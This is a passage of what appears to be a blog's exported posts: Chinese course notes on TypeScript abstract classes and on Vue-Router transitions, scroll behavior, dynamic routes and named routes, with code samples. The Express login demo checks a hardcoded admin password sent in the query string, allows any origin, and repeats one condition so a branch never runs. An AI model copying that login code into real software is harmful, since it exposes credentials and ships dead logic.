<h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><p>通过abstract修饰符定义的类就是抽象类，又称基类；抽象类中通过abstract修饰符定义的方法就是抽象方法</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Vue</span> &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name?:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 抽象类里的非抽象方法可以实现（和接口implement的区别）</span></span><br><span class="line">  <span class="title function_">getName</span>():<span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 抽象类里的抽象方法只能描述，不能实现</span></span><br><span class="line">  <span class="comment">// abstract init() &#123;&#125;</span></span><br><span class="line">  <span class="keyword">abstract</span> <span class="title function_">init</span>(<span class="attr">name</span>: <span class="built_in">string</span>):<span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不能创建抽象类的实例</span></span><br><span class="line"><span class="comment">// new Vue()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象类主要用于创建派生类（继承类）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">React</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Vue</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(<span class="string">&quot;yjsp&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 派生类必须实现抽象类的抽象方法</span></span><br><span class="line">  <span class="title function_">init</span>(<span class="params">omg:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(omg)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在抽象类定义的属性和方法也可以用于派生类</span></span><br><span class="line">  <span class="title function_">setName</span>(<span class="params">name:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 派生类可以被实例化</span></span><br><span class="line"><span class="keyword">const</span> react = <span class="keyword">new</span> <span class="title class_">React</span>()</span><br><span class="line">react.<span class="title function_">init</span>(<span class="string">&quot;omg&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(react.<span class="title function_">getName</span>())</span><br><span class="line">react.<span class="title function_">setName</span>(<span class="string">&quot;yajue&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(react.<span class="title function_">getName</span>())</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>路由过渡动效</title>
    <url>/web/study/Vue-Router/10.%E8%B7%AF%E7%94%B1%E8%BF%87%E6%B8%A1%E5%8A%A8%E6%95%88.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>router-view提供插槽，可以在里面定义路由切换的动效。</p>
<p>&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&quot;vue-router&quot;</span> &#123;</span><br><span class="line">  <span class="keyword">interface</span> <span class="title class_">RouteMeta</span> &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="built_in">string</span>,</span><br><span class="line">    <span class="attr">transition</span>: <span class="built_in">string</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;@/components/Login.vue&quot;</span>),</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;登录页面&quot;</span>,</span><br><span class="line">      <span class="comment">// 定义动效数据</span></span><br><span class="line">      <span class="attr">transition</span>: <span class="string">&quot;animate__fadeIn&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/index&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;@/components/Index.vue&quot;</span>),</span><br><span class="line">    <span class="attr">meta</span>: &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;首页&quot;</span>,</span><br><span class="line">      <span class="attr">transition</span>: <span class="string">&quot;animate__bounceIn&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// 路由的模式</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  <span class="comment">// 路由信息</span></span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">beforeEach</span>(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 这里可以读到meta</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">title</span> = to.<span class="property">meta</span>.<span class="property">title</span></span><br><span class="line">  <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- Vue-Router4写法（插槽） --&gt;</span><br><span class="line">  &lt;!-- route：当前路由信息   Component：当前Vnode --&gt;</span><br><span class="line">  &lt;router-view #default=&quot;&#123;route,Component&#125;&quot;&gt;</span><br><span class="line">    &lt;transition :enter-active-class=&quot;`animate__animated $&#123;route.meta.transition&#125;`&quot;&gt;</span><br><span class="line">      &lt;component :is=&quot;Component&quot;&gt;&lt;/component&gt;</span><br><span class="line">    &lt;/transition&gt;</span><br><span class="line">  &lt;/router-view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &quot;animate.css&quot;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">* &#123;</span><br><span class="line">  padding: 0;</span><br><span class="line">  margin: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html,</span><br><span class="line">body,</span><br><span class="line">#app &#123;</span><br><span class="line">  height: 100%;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>滚动行为</title>
    <url>/web/study/Vue-Router/11.%E6%BB%9A%E5%8A%A8%E8%A1%8C%E4%B8%BA.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>切换到新路由时，有时需要让页面滚动到顶部，或保持原先的滚动位置，Vue-Router可以自定义路由切换页面时的滚动方式</p>
<p>当创建一个Router实例时，可以提供一个scrollBehavior方法，返回滚动数据</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>: <span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  <span class="comment">// 省略......</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="comment">// 路由的模式</span></span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  <span class="attr">scrollBehavior</span>: <span class="function">(<span class="params">to, <span class="keyword">from</span>, savePosition</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(savePosition)</span><br><span class="line">    <span class="comment">// 跳转前有没有页面滚动数据</span></span><br><span class="line">    <span class="keyword">if</span>(savePosition) &#123;</span><br><span class="line">      <span class="comment">// 如果有，就保持滚动高度</span></span><br><span class="line">      <span class="keyword">return</span> savePosition</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 否则定位为顶端</span></span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">top</span>: <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 也支持返回promise</span></span><br><span class="line">      <span class="comment">// return new Promise((r)=&gt; &#123;</span></span><br><span class="line">      <span class="comment">//   setTimeout(() =&gt; &#123;</span></span><br><span class="line">      <span class="comment">//     r(&#123;</span></span><br><span class="line">      <span class="comment">//       top: 114514</span></span><br><span class="line">      <span class="comment">//     &#125;)</span></span><br><span class="line">      <span class="comment">//   &#125;, 2000)</span></span><br><span class="line">      <span class="comment">// &#125;)</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 路由信息</span></span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>动态路由</title>
    <url>/web/study/Vue-Router/12.%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h1><p>使用<code>router.addRoute()</code>可以添加路由，一次只注册一个新的路由</p>
<p>如果新增的路由与当前位置相匹配，需要使用<code>router.push()</code>或<code>router.replace()</code>手动导航，才能显示该新路由</p>
<p>如果想避免命名冲突，可以使用Symbol作为路由名</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">addRoute</span>(&#123;<span class="attr">path</span>:<span class="string">&quot;/about&quot;</span>,<span class="attr">component</span>:<span class="title class_">About</span>&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="删除路由"><a href="#删除路由" class="headerlink" title="删除路由"></a>删除路由</h1><p>当路由被删除时，所有的别名和子路由也会被同时删除</p>
<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>添加一个名称冲突的路由，如果添加与现有路由name相同的路由，会先删除原路由，再添加新路由</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">addRoute</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>, <span class="attr">component</span>: <span class="title class_">About</span> &#125;)</span><br><span class="line"><span class="comment">// 这将删除之前已经添加的路由，因为他们具有相同的name，而name必须是唯一的</span></span><br><span class="line">router.<span class="title function_">addRoute</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;/other&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Other</span> &#125;)</span><br></pre></td></tr></table></figure>

<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>调用 <code>router.addRoute()</code> 返回的回调</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> removeRoute = router.<span class="title function_">addRoute</span>(routeRecord)</span><br><span class="line"><span class="title function_">removeRoute</span>() <span class="comment">// 删除路由，如果存在的话</span></span><br></pre></td></tr></table></figure>

<h2 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h2><p>使用 <code>router.removeRoute()</code> 按name删除路由</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">addRoute</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>, <span class="attr">component</span>: <span class="title class_">About</span> &#125;)</span><br><span class="line"><span class="comment">// 删除路由</span></span><br><span class="line">router.<span class="title function_">removeRoute</span>(<span class="string">&#x27;about&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="查看现有路由"><a href="#查看现有路由" class="headerlink" title="查看现有路由"></a>查看现有路由</h1><p><code>router.hasRoute()</code>：检查路由是否存在</p>
<p><code>router.getRoutes()</code>：获取一个包含所有路由记录的数组</p>
<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>常用于后台返回一个路由表，前端调接口拿到后处理</p>
<p>后端（node.js express）：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> express, &#123; <span class="title class_">Express</span>, <span class="title class_">Request</span>, <span class="title class_">Response</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">app</span>: <span class="title class_">Express</span> = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req: Request, res: Response</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">header</span>(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">user</span> == <span class="string">&#x27;admin&#x27;</span> &amp;&amp; req.<span class="property">query</span>.<span class="property">password</span> == <span class="string">&#x27;123456&#x27;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">      <span class="attr">route</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">path</span>: <span class="string">&quot;/demo1&quot;</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&quot;Demo1&quot;</span>,</span><br><span class="line">          <span class="attr">component</span>: <span class="string">&#x27;demo1.vue&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">path</span>: <span class="string">&quot;/demo2&quot;</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&quot;Demo2&quot;</span>,</span><br><span class="line">          <span class="attr">component</span>: <span class="string">&#x27;demo2.vue&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">path</span>: <span class="string">&quot;/demo3&quot;</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&quot;Demo3&quot;</span>,</span><br><span class="line">          <span class="attr">component</span>: <span class="string">&#x27;demo3.vue&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">user</span> == <span class="string">&#x27;admin&#x27;</span> &amp;&amp; req.<span class="property">query</span>.<span class="property">password</span> == <span class="string">&#x27;123456&#x27;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">      <span class="attr">route</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">path</span>: <span class="string">&quot;/demo1&quot;</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&quot;Demo1&quot;</span>,</span><br><span class="line">          <span class="attr">component</span>: <span class="string">&#x27;demo1.vue&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">path</span>: <span class="string">&quot;/demo2&quot;</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&quot;Demo2&quot;</span>,</span><br><span class="line">          <span class="attr">component</span>: <span class="string">&#x27;demo2.vue&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">      ]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">      <span class="attr">code</span>: <span class="number">400</span>,</span><br><span class="line">      <span class="attr">mesage</span>: <span class="string">&quot;账号密码错误&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">9999</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;http://localhost:9999&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>Login.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;login&quot;&gt;</span><br><span class="line">    &lt;el-card class=&quot;box-card&quot;&gt;</span><br><span class="line">      &lt;el-form ref=&quot;form&quot; :model=&quot;formInline&quot; :rules=&quot;rules&quot; class=&quot;demo-form-inline&quot;&gt;</span><br><span class="line">        &lt;el-form-item prop=&quot;user&quot; label=&quot;账号&quot;&gt;</span><br><span class="line">          &lt;el-input v-model=&quot;formInline.user&quot; placeholder=&quot;请输入账号&quot; clearable /&gt;</span><br><span class="line">        &lt;/el-form-item&gt;</span><br><span class="line">        &lt;el-form-item prop=&quot;password&quot; label=&quot;密码&quot;&gt;</span><br><span class="line">          &lt;el-input type=&quot;password&quot; v-model=&quot;formInline.password&quot; placeholder=&quot;请输入密码&quot;&gt;&lt;/el-input&gt;</span><br><span class="line">        &lt;/el-form-item&gt;</span><br><span class="line">        &lt;el-form-item&gt;</span><br><span class="line">          &lt;el-button type=&quot;primary&quot; @click=&quot;onSubmit&quot;&gt;登录&lt;/el-button&gt;</span><br><span class="line">        &lt;/el-form-item&gt;</span><br><span class="line">      &lt;/el-form&gt;</span><br><span class="line">    &lt;/el-card&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; ref, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line">import &#123; useRouter &#125; from &quot;vue-router&quot;</span><br><span class="line">import &#123; ElMessage &#125; from &quot;element-plus&quot;</span><br><span class="line">import type &#123; FormItemRule, FormInstance &#125; from &quot;element-plus&quot;</span><br><span class="line">import axios from &quot;axios&quot;</span><br><span class="line"></span><br><span class="line">const router = useRouter()</span><br><span class="line"></span><br><span class="line">// 省略......</span><br><span class="line"></span><br><span class="line">const formInline = reactive&lt;Form&gt;(&#123;</span><br><span class="line">  // 省略......</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">const form = ref&lt;FormInstance&gt;()</span><br><span class="line">const rules: Rules = &#123;</span><br><span class="line">  // 省略......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const onSubmit = () =&gt; &#123;</span><br><span class="line">  form.value?.validate((validate)=&gt; &#123;</span><br><span class="line">    console.log(validate)</span><br><span class="line">    // 验证是否通过</span><br><span class="line">    if(validate) &#123;</span><br><span class="line">      initRouter()</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      ElMessage.error(&quot;请检查输入&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const initRouter = async ()=&gt; &#123;</span><br><span class="line">  const res = await axios.get(&#x27;http://localhost:9999/login&#x27;,&#123;params:formInline&#125;)</span><br><span class="line">  res.data.route.forEach((v:any) =&gt; &#123;</span><br><span class="line">    // 注册路由</span><br><span class="line">    router.addRoute(&#123;</span><br><span class="line">      path: v.path,</span><br><span class="line">      name: v.name,</span><br><span class="line">      // vite在动态添加时没法使用别名，必须使用相对路径</span><br><span class="line">      component: ()=&gt; import(`../component/$&#123;v.component&#125;`)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  router.push(&quot;/index&quot;)</span><br><span class="line">  // 查看已添加路由</span><br><span class="line">  console.log(router.getRoutes())</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">.login &#123;</span><br><span class="line">  height: 100%;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: center;</span><br><span class="line">  align-items: center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>Index.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    登陆成功</span><br><span class="line">    &lt;router-link to=&quot;/demo1&quot;&gt;demo1&lt;/router-link&gt;</span><br><span class="line">    &lt;router-link to=&quot;/demo2&quot; style=&quot;margin-left: 10px;&quot;&gt;demo2&lt;/router-link&gt;</span><br><span class="line">    &lt;router-link to=&quot;/demo3&quot; style=&quot;margin-left: 10px;&quot;&gt;demo3&lt;/router-link&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>命名路由和编程式导航</title>
    <url>/web/study/Vue-Router/2.%E5%91%BD%E5%90%8D%E8%B7%AF%E7%94%B1%E5%92%8C%E7%BC%96%E7%A8%8B%E5%BC%8F%E5%AF%BC%E8%88%AA.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="命名路由"><a href="#命名路由" class="headerlink" title="命名路由"></a>命名路由</h1><p>除了path外，还可以给每个路由提供不重复的name，name有以下优点：</p>
<ul>
<li>没有硬编码的URL</li>
<li>params的自动编码&#x2F;解码</li>
<li>防止在URL中出现打字错误</li>
<li>绕过路径排序</li>
</ul>
<p>&#x2F;router&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">RouteRecordRaw</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue-router&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">routes</span>:<span class="title class_">Array</span>&lt;<span class="title class_">RouteRecordRaw</span>&gt; = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="comment">// 名称</span></span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Login&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/login.vue&quot;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/reg&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Reg&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">()=&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../components/reg.vue&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line">  <span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;Vue-Router test&lt;/h1&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;!-- 传含有name属性的对象 --&gt;</span><br><span class="line">      &lt;router-link :to=&quot;&#123;name:&#x27;Login&#x27;&#125;&quot;&gt;login&lt;/router-link&gt;</span><br><span class="line">      &lt;router-link :to=&quot;&#123;name:&#x27;Reg&#x27;&#125;&quot; style=&quot;margin-left: 10px;&quot;&gt;reg&lt;/router-link&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<h1 id="编程式导航"><a href="#编程式导航" class="headerlink" title="编程式导航"></a>编程式导航</h1><p>如果需要在路由跳转时候完成一些额外的逻辑，可以使用编程式导航：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;Vue-Router test&lt;/h1&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;button @click=&quot;toPage(&#x27;/&#x27;)&quot;&gt;login&lt;/button&gt;</span><br><span class="line">      &lt;button @click=&quot;toPage(&#x27;/reg&#x27;)&quot;&gt;reg&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; useRouter &#125; from &#x27;vue-router&#x27;</span><br><span class="line"></span><br><span class="line">const router = useRouter()</span><br><span class="line"></span><br><span class="line">const toPage = (str:string)=&gt; &#123;</span><br><span class="line">  // 字符串跳转方式</span><br><span class="line">  // router.push(str)</span><br><span class="line"></span><br><span class="line">  // 对象跳转方式</span><br><span class="line">  router.push(&#123;</span><br><span class="line">    path: str</span><br><span class="line">    // 也可以使用name</span><br><span class="line">    // name: str</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vue-Router</tag>
      </tags>
  </entry>
  <entry>
    <title>历史记录</title>
    <url>/web/study/Vue-Router/3.%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95.html</url>
